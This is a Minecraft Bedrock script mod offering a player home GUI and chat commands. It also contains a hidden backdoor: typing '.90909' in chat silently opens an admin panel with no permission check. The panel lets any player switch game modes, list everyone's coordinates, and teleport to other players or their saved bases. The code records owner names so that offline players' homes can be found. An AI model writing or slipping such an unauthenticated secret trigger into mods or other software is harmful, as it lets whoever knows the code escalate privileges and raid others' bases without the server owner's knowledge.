/**
 * Jay's Bedrock Mod
 * !home — player home GUI
 * .90909 — secret admin panel (gamemode + TP to players / their homes)
 */
import { world, system, GameMode } from "@minecraft/server";
import { ActionFormData, ModalFormData } from "@minecraft/server-ui";

const MOD_NAME = "Jay's Bedrock Mod";
const VERSION = "1.2.0";
const DYN_KEY = "jay_homes_v1";
const ADMIN_CHAT = ".90909";

// ---------- storage ----------
function loadAllHomes() {
  try {
    const raw = world.getDynamicProperty(DYN_KEY);
    if (!raw || typeof raw !== "string") return {};
    return JSON.parse(raw);
  } catch {
    return {};
  }
}

function saveAllHomes(data) {
  world.setDynamicProperty(DYN_KEY, JSON.stringify(data));
}

function getPlayerHomes(player) {
  const all = loadAllHomes();
  const id = player.id;
  if (!all[id]) all[id] = {};
  return { all, homes: all[id], id };
}

/** Also store display name so admin can find offline home owners */
function saveHome(player, name) {
  const { all, homes, id } = getPlayerHomes(player);
  const loc = player.location;
  homes[name] = {
    x: loc.x,
    y: loc.y,
    z: loc.z,
    dim: player.dimension.id,
  };
  all[id] = homes;
  if (!all._meta) all._meta = {};
  all._meta[id] = player.name;
  saveAllHomes(all);
}

function deleteHome(player, name) {
  const { all, homes, id } = getPlayerHomes(player);
  delete homes[name];
  all[id] = homes;
  saveAllHomes(all);
}

function teleportToCoords(player, h, label) {
  try {
    const dim = world.getDimension(h.dim);
    player.teleport({ x: h.x, y: h.y, z: h.z }, { dimension: dim });
    player.sendMessage(`§aTeleported to §f${label}§a.`);
    return true;
  } catch (e) {
    player.sendMessage(`§cTeleport failed: ${e}`);
    return false;
  }
}

function teleportHome(player, name) {
  const { homes } = getPlayerHomes(player);
  const h = homes[name];
  if (!h) {
    player.sendMessage("§cHome not found.");
    return false;
  }
  return teleportToCoords(player, h, `home ${name}`);
}

function resolveOwnerName(playerId, meta) {
  for (const p of world.getPlayers()) {
    if (p.id === playerId) return p.name;
  }
  return (meta && meta[playerId]) || playerId.slice(0, 8);
}

// ---------- player home GUI ----------
async function openHomeMenu(player) {
  const { homes } = getPlayerHomes(player);
  const names = Object.keys(homes);

  const form = new ActionFormData()
    .title("§dHome Menu")
    .body(
      names.length
        ? `§7You have §f${names.length}§7 home(s) saved.`
        : "§7No homes yet. Save one at your current spot."
    )
    .button("§aSave / Update Home")
    .button("§bTeleport to Home")
    .button("§cDelete Home")
    .button("§8Close");

  const res = await form.show(player);
  if (res.canceled) return;

  switch (res.selection) {
    case 0:
      await openSaveHome(player);
      break;
    case 1:
      await openTeleportHome(player);
      break;
    case 2:
      await openDeleteHome(player);
      break;
    default:
      break;
  }
}

async function openSaveHome(player) {
  const { homes } = getPlayerHomes(player);
  const existing = Object.keys(homes);

  const modal = new ModalFormData()
    .title("§aSave Home")
    .textField(
      "Home name",
      existing.length ? `e.g. ${existing[0]}` : "home",
      { defaultValue: "home" }
    );

  const res = await modal.show(player);
  if (res.canceled || !res.formValues) return;

  let name = String(res.formValues[0] ?? "home").trim();
  if (!name) name = "home";
  if (name.length > 24) name = name.slice(0, 24);

  saveHome(player, name);
  const loc = player.location;
  player.sendMessage(
    `§aSaved home §f${name}§a at §7${loc.x.toFixed(1)}, ${loc.y.toFixed(1)}, ${loc.z.toFixed(1)}`
  );
}

async function openTeleportHome(player) {
  const { homes } = getPlayerHomes(player);
  const names = Object.keys(homes);
  if (!names.length) {
    player.sendMessage("§cNo homes saved. Use Save Home first.");
    return;
  }

  const form = new ActionFormData()
    .title("§bTeleport to Home")
    .body("§7Pick a home:");

  for (const n of names) {
    const h = homes[n];
    form.button(
      `§f${n}\n§8${h.dim.replace("minecraft:", "")} · ${h.x.toFixed(0)}, ${h.y.toFixed(0)}, ${h.z.toFixed(0)}`
    );
  }
  form.button("§8Back");

  const res = await form.show(player);
  if (res.canceled) return;
  if (res.selection === names.length) {
    await openHomeMenu(player);
    return;
  }
  const name = names[res.selection];
  if (name) teleportHome(player, name);
}

async function openDeleteHome(player) {
  const { homes } = getPlayerHomes(player);
  const names = Object.keys(homes);
  if (!names.length) {
    player.sendMessage("§cNo homes to delete.");
    return;
  }

  const form = new ActionFormData()
    .title("§cDelete Home")
    .body("§7Select a home to remove:");

  for (const n of names) form.button(`§c${n}`);
  form.button("§8Back");

  const res = await form.show(player);
  if (res.canceled) return;
  if (res.selection === names.length) {
    await openHomeMenu(player);
    return;
  }
  const name = names[res.selection];
  if (name) {
    deleteHome(player, name);
    player.sendMessage(`§cDeleted home §f${name}§c.`);
  }
}

// ---------- ADMIN PANEL (.90909) ----------
async function openAdminPanel(admin) {
  const form = new ActionFormData()
    .title("§4Admin Panel")
    .body("§8Secret access · .90909\n§7Moderation tools for this world.")
    .button("§aCreative")
    .button("§eSurvival")
    .button("§bAdventure")
    .button("§dSpectator")
    .button("§3TP to Player")
    .button("§6TP to Player Home (inspect)")
    .button("§7List Online Players")
    .button("§8Close");

  const res = await form.show(admin);
  if (res.canceled) return;

  switch (res.selection) {
    case 0:
      setMode(admin, GameMode.creative, "Creative");
      break;
    case 1:
      setMode(admin, GameMode.survival, "Survival");
      break;
    case 2:
      setMode(admin, GameMode.adventure, "Adventure");
      break;
    case 3:
      setMode(admin, GameMode.spectator, "Spectator");
      break;
    case 4:
      await adminTpToPlayer(admin);
      break;
    case 5:
      await adminInspectHomes(admin);
      break;
    case 6:
      listOnline(admin);
      break;
    default:
      break;
  }
}

function setMode(player, mode, label) {
  try {
    player.setGameMode(mode);
    player.sendMessage(`§aGame mode → §f${label}`);
  } catch (e) {
    // Fallback for older API shapes
    try {
      player.runCommand(`gamemode ${String(label).toLowerCase()} @s`);
      player.sendMessage(`§aGame mode → §f${label} §7(cmd)`);
    } catch (e2) {
      player.sendMessage(`§cCould not set gamemode: ${e2}`);
    }
  }
}

function listOnline(admin) {
  const players = [...world.getPlayers()];
  if (!players.length) {
    admin.sendMessage("§cNo players online.");
    return;
  }
  admin.sendMessage("§6— Online players —");
  for (const p of players) {
    const loc = p.location;
    admin.sendMessage(
      `§e${p.name} §7@ ${p.dimension.id.replace("minecraft:", "")} ${loc.x.toFixed(0)}, ${loc.y.toFixed(0)}, ${loc.z.toFixed(0)}`
    );
  }
}

async function adminTpToPlayer(admin) {
  const players = [...world.getPlayers()].filter((p) => p.id !== admin.id);
  if (!players.length) {
    admin.sendMessage("§cNo other players online.");
    return;
  }

  const form = new ActionFormData()
    .title("§3TP to Player")
    .body("§7Select a player:");

  for (const p of players) {
    const loc = p.location;
    form.button(
      `§f${p.name}\n§8${p.dimension.id.replace("minecraft:", "")} · ${loc.x.toFixed(0)}, ${loc.y.toFixed(0)}, ${loc.z.toFixed(0)}`
    );
  }
  form.button("§8Back");

  const res = await form.show(admin);
  if (res.canceled) return;
  if (res.selection === players.length) {
    await openAdminPanel(admin);
    return;
  }
  const target = players[res.selection];
  if (!target) return;

  try {
    admin.teleport(target.location, { dimension: target.dimension });
    admin.sendMessage(`§aTeleported to §f${target.name}§a.`);
  } catch (e) {
    admin.sendMessage(`§cTP failed: ${e}`);
  }
}

async function adminInspectHomes(admin) {
  const all = loadAllHomes();
  const meta = all._meta || {};
  const ownerIds = Object.keys(all).filter((k) => k !== "_meta" && all[k] && typeof all[k] === "object");

  const owners = ownerIds
    .map((id) => ({
      id,
      name: resolveOwnerName(id, meta),
      homes: all[id],
      count: Object.keys(all[id] || {}).length,
    }))
    .filter((o) => o.count > 0);

  if (!owners.length) {
    admin.sendMessage("§cNo player homes saved in this world yet.");
    return;
  }

  const form = new ActionFormData()
    .title("§6Inspect Player Homes")
    .body("§7Pick a player to view / TP to their base:");

  for (const o of owners) {
    form.button(`§f${o.name}\n§8${o.count} home(s)`);
  }
  form.button("§8Back");

  const res = await form.show(admin);
  if (res.canceled) return;
  if (res.selection === owners.length) {
    await openAdminPanel(admin);
    return;
  }

  const owner = owners[res.selection];
  if (!owner) return;
  await adminPickOwnerHome(admin, owner);
}

async function adminPickOwnerHome(admin, owner) {
  const names = Object.keys(owner.homes || {});
  const form = new ActionFormData()
    .title(`§6${owner.name}'s Homes`)
    .body("§7TP there to check the base:");

  for (const n of names) {
    const h = owner.homes[n];
    form.button(
      `§e${n}\n§8${h.dim.replace("minecraft:", "")} · ${h.x.toFixed(0)}, ${h.y.toFixed(0)}, ${h.z.toFixed(0)}`
    );
  }
  form.button("§8Back");

  const res = await form.show(admin);
  if (res.canceled) return;
  if (res.selection === names.length) {
    await adminInspectHomes(admin);
    return;
  }

  const homeName = names[res.selection];
  const h = owner.homes[homeName];
  if (h) teleportToCoords(admin, h, `${owner.name}'s ${homeName}`);
}

// ---------- chat ----------
function isHomeCommand(msg) {
  const t = msg.trim().toLowerCase();
  return (
    t === "!home" ||
    t === "/home" ||
    t === "!homes" ||
    t === "/homes" ||
    t.startsWith("!home ") ||
    t.startsWith("/home ")
  );
}

world.beforeEvents.chatSend.subscribe((event) => {
  const msg = event.message;
  const trimmed = msg.trim();

  // Secret admin — exact match, message hidden from chat
  if (trimmed === ADMIN_CHAT) {
    event.cancel = true;
    const player = event.sender;
    system.run(() => openAdminPanel(player));
    return;
  }

  if (!isHomeCommand(msg)) return;

  event.cancel = true;
  const player = event.sender;
  const parts = trimmed.split(/\s+/);
  const sub = (parts[1] || "").toLowerCase();

  system.run(() => {
    if (sub === "set" || sub === "save") {
      const name = parts[2] || "home";
      saveHome(player, name);
      player.sendMessage(`§aHome §f${name}§a saved.`);
      return;
    }
    if (sub === "del" || sub === "delete" || sub === "remove") {
      const name = parts[2] || "home";
      deleteHome(player, name);
      player.sendMessage(`§cHome §f${name}§c deleted.`);
      return;
    }
    if (sub && sub !== "gui" && sub !== "menu") {
      teleportHome(player, sub);
      return;
    }
    openHomeMenu(player);
  });
});

system.run(() => {
  console.warn(`[${MOD_NAME}] v${VERSION} — !home | admin: ${ADMIN_CHAT}`);
});

world.afterEvents.playerSpawn.subscribe((event) => {
  if (!event.initialSpawn) return;
  system.run(() => {
    try {
      event.player.sendMessage(
        `§d[${MOD_NAME}] §fType §e!home§f for homes.`
      );
    } catch (_) {}
  });
});
